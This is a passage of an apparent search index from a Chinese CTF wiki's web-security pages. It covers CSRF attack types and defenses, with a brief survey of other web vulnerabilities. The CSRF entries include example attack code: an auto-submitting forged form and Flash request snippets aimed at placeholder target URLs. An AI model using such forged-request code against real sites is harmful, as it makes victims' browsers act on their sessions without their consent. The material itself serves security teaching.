\u7b49\u94fe\u63a5\u5730\u5740\u7684\u6807\u7b7e\u90fd\u53ef\u4ee5\u53d1\u8d77\u4e00\u4e2a GET \u8bf7\u6c42\uff0c\u5982\uff1a < link href = \"\" > < img src = \"\" > < img lowsrc = \"\" > < img dynsrc = \"\" > < meta http-equiv = \"refresh\" content = \"0; url=\" > < iframe src = \"\" > < frame src = \"\" > < script src = \"\" ></ script > < bgsound src = \"\" ></ bgsound > < embed src = \"\" ></ bgsound > < video src = \"\" ></ video > < audio src = \"\" ></ audio > < a href = \"\" ></ a > < table background = \"\" ></ table > ...... \u8fd8\u6709 CSS \u6837\u5f0f\u4e2d\u7684\uff1a @ import \"\" background : url ( \"\" ) ...... \u4e5f\u53ef\u4f7f\u7528\u8868\u5355\u6765\u5bf9 POST \u578b\u7684\u8bf7\u6c42\u8fdb\u884c\u4f2a\u9020\u3002 < form action = \"http://www.a.com/register\" id = \"register\" method = \"post\" > < input type = text name = \"username\" value = \"\" /> < input type = password name = \"password\" value = \"\" /> </ form > < script > var f = document . getElementById ( \"register\" ); f . inputs [ 0 ]. value = \"test\" ; f . inputs [ 1 ]. value = \"passwd\" ; f . submit (); </ script > Flash CSRF \u00b6 Flash \u4e5f\u6709\u5404\u79cd\u65b9\u5f0f\u53ef\u4ee5\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\uff0c\u5305\u62ec POST\u3002 import flash . net . URLRequest ; import flash . system . Security ; var url = new URLRequest ( \"http://target/page\" ); var param = new URLVariables (); param = \"test=123\" ; url . method = \"POST\" ; url . data = param ; sendToURL ( url ); stop (); Flash \u4e2d\u8fd8\u53ef\u4ee5\u4f7f\u7528 getURL \u3001 loadVars \u7b49\u65b9\u5f0f\u53d1\u8d77\u8bf7\u6c42\u3002 req = new LoadVars (); req . addRequestHeader ( \"foo\" , \"bar\" ); req . send ( \"http://target/page?v1=123&v2=222\" , \"_blank\" , \"GET\" ); CSRF \u7684\u9632\u5fa1 \u00b6 \u9a8c\u8bc1\u7801 \u00b6 \u9a8c\u8bc1\u7801\u5f3a\u5236\u7528\u6237\u5fc5\u987b\u4e0e\u5e94\u7528\u8fdb\u884c\u4ea4\u4e92\uff0c\u624d\u80fd\u5b8c\u6210\u6700\u7ec8\u8bf7\u6c42\u3002 Referer Check \u00b6 \u68c0\u67e5\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u5408\u6cd5\u7684\u6e90\u3002\u4f46\u670d\u52a1\u5668\u5e76\u975e\u4ec0\u4e48\u65f6\u5019\u90fd\u80fd\u53d6\u5f97 Referer\u3002 Token \u00b6 CSRF \u80fd\u591f\u653b\u51fb\u6210\u529f\u7684\u672c\u8d28\u539f\u56e0\u662f\u91cd\u8981\u64cd\u4f5c\u7684\u6240\u6709\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u731c\u6d4b\u5f97\u5230\u3002 \u4fdd\u6301\u539f\u53c2\u6570\u4e0d\u53d8\uff0c\u65b0\u589e\u4e00\u4e2a\u53c2\u6570 Token\uff0c\u503c\u662f\u968f\u673a\u7684\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0cToken \u53ef\u4ee5\u653e\u5728\u7528\u6237\u7684 Session \u4e2d\uff0c\u6216\u6d4f\u89c8\u5668\u7684 Cookies \u4e2d\u3002 Token \u4e00\u5b9a\u8981\u8db3\u591f\u968f\u673a\u3002\u6b64\u5916\uff0cToken \u7684\u76ee\u7684\u4e0d\u662f\u4e3a\u4e86\u9632\u6b62\u91cd\u590d\u63d0\u4ea4\uff0c\u6240\u4ee5\u4e3a\u4e86\u4f7f\u7528\u65b9\u4fbf\uff0c\u53ef\u4ee5\u5141\u8bb8\u5728\u4e00\u4e2a\u7528\u6237\u7684\u6709\u6548\u751f\u547d\u5468\u671f\u5185\uff0c\u5728 Token \u6d88\u8017\u6389\u4e4b\u524d\u90fd\u4f7f\u7528\u540c\u4e00\u4e2a Token\uff0c\u4f46\u5982\u679c\u7528\u6237\u5df2\u7ecf\u63d0\u4ea4\u4e86\u8868\u5355\uff0c\u5219\u8fd9\u4e2a Token \u5df2\u7ecf\u6d88\u8017\u6389\uff0c\u5e94\u8be5\u91cd\u65b0\u751f\u6210 Token\u3002 Token \u8fd8\u5e94\u6ce8\u610f\u5176\u4fdd\u5bc6\u6027\uff0c\u5982\u679c Token \u51fa\u73b0\u5728 URL \u4e2d\uff0c\u5219\u53ef\u80fd\u4f1a\u901a\u8fc7 Referer \u6cc4\u9732\uff0c\u5e94\u5c3d\u91cf\u628a Token \u653e\u5728\u8868\u5355\u4e2d\uff0c\u628a\u654f\u611f\u64cd\u4f5c\u7531 GET \u6539\u4e3a POST\uff0c\u4ee5\u8868\u5355\u6216 AJAX \u7684\u5f62\u5f0f\u63d0\u4ea4\uff0c\u907f\u514d Token \u6cc4\u9732\u3002","title":"CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020"},{"location":"web/csrf/#csrf","text":"CSRF\uff0c\u5168\u540d Cross Site Request Forgery\uff0c\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u3002\u5f88\u5bb9\u6613\u5c06\u5b83\u4e0e XSS \u6df7\u6dc6\uff0c\u5bf9\u4e8e CSRF\uff0c\u5176\u4e24\u4e2a\u5173\u952e\u70b9\u662f\u8de8\u7ad9\u70b9\u7684\u8bf7\u6c42\u4e0e\u8bf7\u6c42\u7684\u4f2a\u9020\uff0c\u7531\u4e8e\u76ee\u6807\u7ad9\u65e0 token \u6216 referer \u9632\u5fa1\uff0c\u5bfc\u81f4\u7528\u6237\u7684\u654f\u611f\u64cd\u4f5c\u7684\u6bcf\u4e00\u4e2a\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u83b7\u77e5\uff0c\u653b\u51fb\u8005\u5373\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a\u5b8c\u5168\u4e00\u6837\u7684\u8bf7\u6c42\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u8fbe\u5230\u6076\u610f\u76ee\u7684\u3002","title":"CSRF \u7b80\u4ecb"},{"location":"web/csrf/#csrf_1","text":"\u6309\u8bf7\u6c42\u7c7b\u578b\uff0c\u53ef\u5206\u4e3a GET \u578b\u548c POST \u578b\u3002 \u6309\u653b\u51fb\u65b9\u5f0f\uff0c\u53ef\u5206\u4e3a HTML CSRF\u3001JSON HiJacking\u3001Flash CSRF \u7b49\u3002","title":"CSRF \u7c7b\u578b"},{"location":"web/csrf/#html-csrf","text":"\u5229\u7528 HTML \u5143\u7d20\u53d1\u51fa CSRF \u8bf7\u6c42\uff0c\u8fd9\u662f\u6700\u5e38\u89c1\u7684 CSRF \u653b\u51fb\u3002 HTML \u4e2d\u80fd\u8bbe\u7f6e src/href \u7b49\u94fe\u63a5\u5730\u5740\u7684\u6807\u7b7e\u90fd\u53ef\u4ee5\u53d1\u8d77\u4e00\u4e2a GET \u8bf7\u6c42\uff0c\u5982\uff1a < link href = \"\" > < img src = \"\" > < img lowsrc = \"\" > < img dynsrc = \"\" > < meta http-equiv = \"refresh\" content = \"0; url=\" > < iframe src = \"\" > < frame src = \"\" > < script src = \"\" ></ script > < bgsound src = \"\" ></ bgsound > < embed src = \"\" ></ bgsound > < video src = \"\" ></ video > < audio src = \"\" ></ audio > < a href = \"\" ></ a > < table background = \"\" ></ table > ...... \u8fd8\u6709 CSS \u6837\u5f0f\u4e2d\u7684\uff1a @ import \"\" background : url ( \"\" ) ...... \u4e5f\u53ef\u4f7f\u7528\u8868\u5355\u6765\u5bf9 POST \u578b\u7684\u8bf7\u6c42\u8fdb\u884c\u4f2a\u9020\u3002 < form action = \"http://www.a.com/register\" id = \"register\" method = \"post\" > < input type = text name = \"username\" value = \"\" /> < input type = password name = \"password\" value = \"\" /> </ form > < script > var f = document . getElementById ( \"register\" ); f . inputs [ 0 ]. value = \"test\" ; f . inputs [ 1 ]. value = \"passwd\" ; f . submit (); </ script >","title":"HTML CSRF"},{"location":"web/csrf/#flash-csrf","text":"Flash \u4e5f\u6709\u5404\u79cd\u65b9\u5f0f\u53ef\u4ee5\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\uff0c\u5305\u62ec POST\u3002 import flash . net . URLRequest ; import flash . system . Security ; var url = new URLRequest ( \"http://target/page\" ); var param = new URLVariables (); param = \"test=123\" ; url . method = \"POST\" ; url . data = param ; sendToURL ( url ); stop (); Flash \u4e2d\u8fd8\u53ef\u4ee5\u4f7f\u7528 getURL \u3001 loadVars \u7b49\u65b9\u5f0f\u53d1\u8d77\u8bf7\u6c42\u3002 req = new LoadVars (); req . addRequestHeader ( \"foo\" , \"bar\" ); req . send ( \"http://target/page?v1=123&v2=222\" , \"_blank\" , \"GET\" );","title":"Flash CSRF"},{"location":"web/csrf/#csrf_2","text":"","title":"CSRF \u7684\u9632\u5fa1"},{"location":"web/csrf/#_1","text":"\u9a8c\u8bc1\u7801\u5f3a\u5236\u7528\u6237\u5fc5\u987b\u4e0e\u5e94\u7528\u8fdb\u884c\u4ea4\u4e92\uff0c\u624d\u80fd\u5b8c\u6210\u6700\u7ec8\u8bf7\u6c42\u3002","title":"\u9a8c\u8bc1\u7801"},{"location":"web/csrf/#referer-check","text":"\u68c0\u67e5\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u5408\u6cd5\u7684\u6e90\u3002\u4f46\u670d\u52a1\u5668\u5e76\u975e\u4ec0\u4e48\u65f6\u5019\u90fd\u80fd\u53d6\u5f97 Referer\u3002","title":"Referer Check"},{"location":"web/csrf/#token","text":"CSRF \u80fd\u591f\u653b\u51fb\u6210\u529f\u7684\u672c\u8d28\u539f\u56e0\u662f\u91cd\u8981\u64cd\u4f5c\u7684\u6240\u6709\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u731c\u6d4b\u5f97\u5230\u3002 \u4fdd\u6301\u539f\u53c2\u6570\u4e0d\u53d8\uff0c\u65b0\u589e\u4e00\u4e2a\u53c2\u6570 Token\uff0c\u503c\u662f\u968f\u673a\u7684\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0cToken \u53ef\u4ee5\u653e\u5728\u7528\u6237\u7684 Session \u4e2d\uff0c\u6216\u6d4f\u89c8\u5668\u7684 Cookies \u4e2d\u3002 Token \u4e00\u5b9a\u8981\u8db3\u591f\u968f\u673a\u3002\u6b64\u5916\uff0cToken \u7684\u76ee\u7684\u4e0d\u662f\u4e3a\u4e86\u9632\u6b62\u91cd\u590d\u63d0\u4ea4\uff0c\u6240\u4ee5\u4e3a\u4e86\u4f7f\u7528\u65b9\u4fbf\uff0c\u53ef\u4ee5\u5141\u8bb8\u5728\u4e00\u4e2a\u7528\u6237\u7684\u6709\u6548\u751f\u547d\u5468\u671f\u5185\uff0c\u5728 Token \u6d88\u8017\u6389\u4e4b\u524d\u90fd\u4f7f\u7528\u540c\u4e00\u4e2a Token\uff0c\u4f46\u5982\u679c\u7528\u6237\u5df2\u7ecf\u63d0\u4ea4\u4e86\u8868\u5355\uff0c\u5219\u8fd9\u4e2a Token \u5df2\u7ecf\u6d88\u8017\u6389\uff0c\u5e94\u8be5\u91cd\u65b0\u751f\u6210 Token\u3002 Token \u8fd8\u5e94\u6ce8\u610f\u5176\u4fdd\u5bc6\u6027\uff0c\u5982\u679c Token \u51fa\u73b0\u5728 URL \u4e2d\uff0c\u5219\u53ef\u80fd\u4f1a\u901a\u8fc7 Referer \u6cc4\u9732\uff0c\u5e94\u5c3d\u91cf\u628a Token \u653e\u5728\u8868\u5355\u4e2d\uff0c\u628a\u654f\u611f\u64cd\u4f5c\u7531 GET \u6539\u4e3a POST\uff0c\u4ee5\u8868\u5355\u6216 AJAX \u7684\u5f62\u5f0f\u63d0\u4ea4\uff0c\u907f\u514d Token \u6cc4\u9732\u3002","title":"Token"},{"location":"web/introduction/","text":"\u968f\u7740 WEB 2.0\u3001\u793e\u4ea4\u7f51\u7edc\u3001\u5fae\u535a\u7b49\u7b49\u4e00\u7cfb\u5217\u65b0\u578b\u7684\u4e92\u8054\u7f51\u4ea7\u54c1\u7684\u8bde\u751f\uff0c\u57fa\u4e8e WEB \u73af\u5883\u7684\u4e92\u8054\u7f51\u5e94\u7528\u8d8a\u6765\u8d8a\u5e7f\u6cdb\uff0c\u4f01\u4e1a\u4fe1\u606f\u5316\u7684\u8fc7\u7a0b\u4e2d\u5404\u79cd\u5e94\u7528\u90fd\u67b6\u8bbe\u5728 WEB \u5e73\u53f0\u4e0a\uff0cWEB \u4e1a\u52a1\u7684\u8fc5\u901f\u53d1\u5c55\u4e5f\u5f15\u8d77\u9ed1\u5ba2\u4eec\u7684\u5f3a\u70c8\u5173\u6ce8\uff0c\u63a5\u8e35\u800c\u81f3\u7684\u5c31\u662f WEB \u5b89\u5168\u5a01\u80c1\u7684\u51f8\u663e\uff0c\u9ed1\u5ba2\u5229\u7528\u7f51\u7ad9\u64cd\u4f5c\u7cfb\u7edf\u7684\u6f0f\u6d1e\u548c WEB \u670d\u52a1\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f97\u5230 WEB \u670d\u52a1\u5668\u7684\u63a7\u5236\u6743\u9650\uff0c\u8f7b\u5219\u7be1\u6539\u7f51\u9875\u5185\u5bb9\uff0c\u91cd\u5219\u7a83\u53d6\u91cd\u8981\u5185\u90e8\u6570\u636e\uff0c\u66f4\u4e3a\u4e25\u91cd\u7684\u5219\u662f\u5728\u7f51\u9875\u4e2d\u690d\u5165\u6076\u610f\u4ee3\u7801\uff0c\u4f7f\u5f97\u7f51\u7ad9\u8bbf\u95ee\u8005\u53d7\u5230\u4fb5\u5bb3\u3002 \u5728 CTF \u7ade\u8d5b\u4e2d\uff0cWEB \u4e5f\u662f\u5360\u6bd4\u91cd\u5f88\u5927\u7684\u4e00\u4e2a\u65b9\u5411\u4e4b\u4e00\uff0cWEB \u7c7b\u7684\u9898\u76ee\u79cd\u7c7b\u7e41\u591a\uff0c\u77e5\u8bc6\u70b9\u7ec6\u788e\uff0c\u65f6\u6548\u6027\u5f3a\uff0c\u80fd\u7d27\u8ddf\u65f6\u4e0b\u70ed\u70b9\u6f0f\u6d1e\uff0c\u8d34\u8fd1\u5b9e\u6218\u3002 WEB \u7c7b\u7684\u9898\u76ee\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1aSQL \u6ce8\u5165\u3001XSS \u8de8\u7ad9\u811a\u672c\u3001CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u6587\u4ef6\u5305\u542b\u3001\u6846\u67b6\u5b89\u5168\u3001PHP \u5e38\u89c1\u6f0f\u6d1e\u3001\u4ee3\u7801\u5ba1\u8ba1\u7b49\u3002 SQL \u6ce8\u5165 \u00b6 \u901a\u8fc7\u5728\u7528\u6237\u53ef\u63a7\u53c2\u6570\u4e2d\u6ce8\u5165 SQL \u8bed\u6cd5\uff0c\u7834\u574f\u539f\u6709 SQL \u7ed3\u6784\uff0c\u8fbe\u5230\u7f16\u5199\u7a0b\u5e8f\u65f6\u610f\u6599\u4e4b\u5916\u7ed3\u679c\u7684\u653b\u51fb\u884c\u4e3a\u3002\u5176\u6210\u56e0\u53ef\u4ee5\u5f52\u7ed3\u4e3a\u4ee5\u4e0b\u4e24\u4e2a\u539f\u56e0\u53e0\u52a0\u9020\u6210\u7684\uff1a \u7a0b\u5e8f\u7f16\u5199\u8005\u5728\u5904\u7406\u5e94\u7528\u7a0b\u5e8f\u548c\u6570\u636e\u5e93\u4ea4\u4e92\u65f6\uff0c\u4f7f\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u65b9\u5f0f\u6784\u9020 SQL \u8bed\u53e5 \u672a\u5bf9\u7528\u6237\u53ef\u63a7\u53c2\u6570\u8fdb\u884c\u8db3\u591f\u7684\u8fc7\u6ee4\u4fbf\u5c06\u53c2\u6570\u5185\u5bb9\u62fc\u63a5\u8fdb\u5165\u5230 SQL \u8bed\u53e5\u4e2d XSS \u8de8\u7ad9\u811a\u672c\u653b\u51fb \u00b6 \u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08Cross Site Scripting\uff09\uff0c\u4e3a\u4e0d\u548c\u5c42\u53e0\u6837\u5f0f\u8868\uff08Cascading Style Sheets\uff0cCSS\uff09\u7684\u7f29\u5199\u6df7\u6dc6\uff0c\u6545\u5c06\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u7f29\u5199\u4e3a XSS\u3002\u6076\u610f\u653b\u51fb\u8005\u5f80 WEB \u9875\u9762\u91cc\u63d2\u5165\u6076\u610f HTML \u4ee3\u7801\uff0c\u5f53\u7528\u6237\u6d4f\u89c8\u8be5\u9875\u4e4b\u65f6\uff0c\u5d4c\u5165\u5176\u4e2d Web \u91cc\u9762\u7684 HTML \u4ee3\u7801\u4f1a\u88ab\u6267\u884c\uff0c\u4ece\u800c\u8fbe\u5230\u6076\u610f\u653b\u51fb\u7528\u6237\u7684\u7279\u6b8a\u76ee\u7684\u3002 \u547d\u4ee4\u6267\u884c \u00b6 \u5f53\u5e94\u7528\u9700\u8981\u8c03\u7528\u4e00\u4e9b\u5916\u90e8\u7a0b\u5e8f\u53bb\u5904\u7406\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u5c31\u4f1a\u7528\u5230\u4e00\u4e9b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u51fd\u6570\u3002\u5982 PHP \u4e2d\u7684 system \u3001 exec \u3001 shell_exec \u7b49\uff0c\u5f53\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u547d\u4ee4\u6267\u884c\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u65f6\uff0c\u5c06\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u7cfb\u7edf\u547d\u4ee4\u5230\u6b63\u5e38\u547d\u4ee4\u4e2d\uff0c\u9020\u6210\u547d\u4ee4\u6267\u884c\u653b\u51fb\u3002\u8fd9\u91cc\u8fd8\u662f\u4e3b\u8981\u4ee5 PHP \u4e3a\u4e3b\u4ecb\u7ecd\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0cJava \u7b49\u5e94\u7528\u7684\u7ec6\u8282\u5f85\u8865\u5145\u3002 \u6587\u4ef6\u5305\u542b \u00b6 \u5982\u679c\u5141\u8bb8\u5ba2\u6237\u7aef\u7528\u6237\u8f93\u5165\u63a7\u5236\u52a8\u6001\u5305\u542b\u5728\u670d\u52a1\u5668\u7aef\u7684\u6587\u4ef6\uff0c\u4f1a\u5bfc\u81f4\u6076\u610f\u4ee3\u7801\u7684\u6267\u884c\u53ca\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff0c\u4e3b\u8981\u5305\u62ec\u672c\u5730\u6587\u4ef6\u5305\u542b\u548c\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u4e24\u79cd\u5f62\u5f0f\u3002 CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 \u00b6 \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff08Cross-Site Request Forgery\uff0cCSRF\uff09\u662f\u4e00\u79cd\u4f7f\u5df2\u767b\u5f55\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u67d0\u79cd\u52a8\u4f5c\u7684\u653b\u51fb\u3002\u56e0\u4e3a\u653b\u51fb\u8005\u770b\u4e0d\u5230\u4f2a\u9020\u8bf7\u6c42\u7684\u54cd\u5e94\u7ed3\u679c\uff0c\u6240\u4ee5 CSRF \u653b\u51fb\u4e3b\u8981\u7528\u6765\u6267\u884c\u52a8\u4f5c\uff0c\u800c\u975e\u7a83\u53d6\u7528\u6237\u6570\u636e\u3002\u5f53\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u666e\u901a\u7528\u6237\u65f6\uff0cCSRF \u53ef\u4ee5\u5b9e\u73b0\u5728\u5176\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u8f6c\u79fb\u7528\u6237\u8d44\u91d1\u3001\u53d1\u9001\u90ae\u4ef6\u7b49\u64cd\u4f5c\uff1b\u4f46\u662f\u5982\u679c\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\u7684\u7528\u6237\u65f6 CSRF \u5219\u53ef\u80fd\u5a01\u80c1\u5230\u6574\u4e2a WEB \u7cfb\u7edf\u7684\u5b89\u5168\u3002 SSRF \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020 \u00b6 SSRF\uff08Server-Side Request Forgery\uff1a\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\uff09\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002 \u6587\u4ef6\u4e0a\u4f20 \u00b6 \u5728\u7f51\u7ad9\u7684\u8fd0\u8425\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u53ef\u907f\u514d\u5730\u8981\u5bf9\u7f51\u7ad9\u7684\u67d0\u4e9b\u9875\u9762\u6216\u8005\u5185\u5bb9\u8fdb\u884c\u66f4\u65b0\uff0c\u8fd9\u65f6\u4fbf\u9700\u8981\u4f7f\u7528\u5230\u7f51\u7ad9\u7684\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\u3002\u5982\u679c\u4e0d\u5bf9\u88ab\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u9650\u5236\u6216\u8005\u9650\u5236\u88ab\u7ed5\u8fc7\uff0c\u8be5\u529f\u80fd\u4fbf\u6709\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u4e8e\u4e0a\u4f20\u53ef\u6267\u884c\u6587\u4ef6\u3001\u811a\u672c\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u8fdb\u800c\u8fdb\u4e00\u6b65\u5bfc\u81f4\u670d\u52a1\u5668\u6ca6\u9677\u3002 \u70b9\u51fb\u52ab\u6301 \u00b6 Clickjacking\uff08\u70b9\u51fb\u52ab\u6301\uff09\u662f\u7531\u4e92\u8054\u7f51\u5b89\u5168\u4e13\u5bb6\u7f57\u4f2f\u7279\u00b7\u6c49\u68ee\u548c\u8036\u5229\u7c73\u00b7\u683c\u52b3\u65af\u66fc\u5728 2008 \u5e74\u9996\u521b\u7684\u3002 \u662f\u4e00\u79cd\u89c6\u89c9\u6b3a\u9a97\u624b\u6bb5\uff0c\u5728 WEB \u7aef\u5c31\u662f iframe \u5d4c\u5957\u4e00\u4e2a\u900f\u660e\u4e0d\u53ef\u89c1\u7684\u9875\u9762\uff0c\u8ba9\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u70b9\u51fb\u653b\u51fb\u8005\u60f3\u8981\u6b3a\u9a97\u7528\u6237\u70b9\u51fb\u7684\u4f4d\u7f6e\u3002 \u7531\u4e8e\u70b9\u51fb\u52ab\u6301\u7684\u51fa\u73b0\uff0c\u4fbf\u51fa\u73b0\u4e86\u53cd frame \u5d4c\u5957\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u70b9\u51fb\u52ab\u6301\u9700\u8981 iframe \u5d4c\u5957\u9875\u9762\u6765\u653b\u51fb\u3002 \u4e0b\u9762\u4ee3\u7801\u662f\u6700\u5e38\u89c1\u7684\u9632\u6b62 frame \u5d4c\u5957\u7684\u4f8b\u5b50\uff1a if ( top . location != location ) top . location = self . location ; VPS \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668 \u00b6 VPS\uff08Virtual Private Server \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff09\u6280\u672f\uff0c\u5c06\u4e00\u90e8\u670d\u52a1\u5668\u5206\u5272\u6210\u591a\u4e2a\u865a\u62df\u4e13\u4eab\u670d\u52a1\u5668\u7684\u4f18\u8d28\u670d\u52a1\u3002\u5b9e\u73b0 VPS \u7684\u6280\u672f\u5206\u4e3a\u5bb9\u5668\u6280\u672f\uff0c\u548c\u865a\u62df\u5316\u6280\u672f\u3002\u5728\u5bb9\u5668\u6216\u865a\u62df\u673a\u4e2d\uff0c\u6bcf\u4e2a VPS \u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51 IP \u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u5b9e\u73b0\u4e0d\u540c VPS \u95f4\u78c1\u76d8\u7a7a\u95f4\u3001\u5185\u5b58\u3001CPU \u8d44\u6e90\u3001\u8fdb\u7a0b\u548c\u7cfb\u7edf\u914d\u7f6e\u7684\u9694\u79bb\uff0c\u4e3a\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\u6a21\u62df\u51fa\u72ec\u5360\u4f7f\u7528\u8ba1\u7b97\u8d44\u6e90\u7684\u4f53\u9a8c\u3002VPS \u53ef\u4ee5\u50cf\u72ec\u7acb\u670d\u52a1\u5668\u4e00\u6837\uff0c\u91cd\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u670d\u52a1\u5668\u3002VPS \u4e3a\u4f7f\u7528\u8005\u63d0\u4f9b\u4e86\u7ba1\u7406\u914d\u7f6e\u7684\u81ea\u7531\uff0c\u53ef\u7528\u4e8e\u4f01\u4e1a\u865a\u62df\u5316\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e IDC \u8d44\u6e90\u79df\u7528\u3002 IDC \u8d44\u6e90\u79df\u7528\uff0c\u7531 VPS \u63d0\u4f9b\u5546\u63d0\u4f9b\u3002\u4e0d\u540c VPS \u63d0\u4f9b\u5546\u6240\u4f7f\u7528\u7684\u786c\u4ef6 VPS \u8f6f\u4ef6\u7684\u5dee\u5f02\uff0c\u53ca\u9500\u552e\u7b56\u7565\u7684\u4e0d\u540c\uff0cVPS \u7684\u4f7f\u7528\u4f53\u9a8c\u4e5f\u6709\u8f83\u5927\u5dee\u5f02\u3002\u5c24\u5176\u662f VPS \u63d0\u4f9b\u5546\u8d85\u5356\uff0c\u5bfc\u81f4\u5b9e\u4f53\u670d\u52a1\u5668\u8d85\u8d1f\u8377\u65f6\uff0cVPS \u6027\u80fd\u5c06\u53d7\u5230\u6781\u5927\u5f71\u54cd\u3002\u76f8\u5bf9\u6765\u8bf4\uff0c\u5bb9\u5668\u6280\u672f\u6bd4\u865a\u62df\u673a\u6280\u672f\u786c\u4ef6\u4f7f\u7528\u6548\u7387\u66f4\u9ad8\uff0c\u66f4\u6613\u4e8e\u8d85\u5356\uff0c\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\u5bb9\u5668 VPS \u7684\u4ef7\u683c\u90fd\u4f4e\u4e8e\u865a\u62df\u673a VPS \u7684\u4ef7\u683c\u3002 \u6761\u4ef6\u7ade\u4e89 \u00b6 \u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u662f\u4e00\u79cd\u670d\u52a1\u5668\u7aef\u7684\u6f0f\u6d1e\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u7aef\u5728\u5904\u7406\u4e0d\u540c\u7528\u6237\u7684\u8bf7\u6c42\u65f6\u662f\u5e76\u53d1\u8fdb\u884c\u7684\uff0c\u56e0\u6b64\uff0c\u5982\u679c\u5e76\u53d1\u5904\u7406\u4e0d\u5f53\u6216\u76f8\u5173\u64cd\u4f5c\u903b\u8f91\u987a\u5e8f\u8bbe\u8ba1\u7684\u4e0d\u5408\u7406\u65f6\uff0c\u5c06\u4f1a\u5bfc\u81f4\u6b64\u7c7b\u95ee\u9898\u7684\u53d1\u751f\u3002 XXE \u00b6 XXE Injection \u5373 XML External Entity Injection\uff0c\u4e5f\u5c31\u662f XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u653b\u51fb.\u6f0f\u6d1e\u662f\u5728\u5bf9\u975e\u5b89\u5168\u7684\u5916\u90e8\u5b9e\u4f53\u6570\u636e\u8fdb\u2f8f\u884c\u5904\u7406\u65f6\u5f15\u53d1\u7684\u5b89\u5168\u95ee\u9898\u3002 \u5728 XML 1.0 \u6807\u51c6\u91cc\uff0cXML \u6587\u6863\u7ed3\u6784\u2fa5\u91cc\u5b9a\u4e49\u4e86\u5b9e\u4f53\uff08entity\uff09\u8fd9\u4e2a\u6982\u5ff5.\u5b9e\u4f53\u53ef\u4ee5\u901a\u8fc7\u9884\u5b9a\u4e49\u5728\u6587\u6863\u4e2d\u8c03\u7528\uff0c\u5b9e\u4f53\u7684\u6807\u8bc6\u7b26\u53ef\u8bbf\u95ee\u672c\u5730\u6216\u8fdc\u7a0b\u5185\u5bb9.\u5982\u679c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5f15\u5165\u4e86\u300c\u6c61\u67d3\u300d\u6e90\uff0c\u5728\u5bf9 XML \u6587\u6863\u5904\u7406\u540e\u5219\u53ef\u80fd\u5bfc\u81f4\u4fe1\u606f\u6cc4\u6f0f\u7b49\u5b89\u5168\u95ee\u9898\u3002 XSCH \u00b6 \u7531\u4e8e\u7f51\u7ad9\u5f00\u53d1\u8005\u5728\u4f7f\u7528 Flash\u3001Silverlight 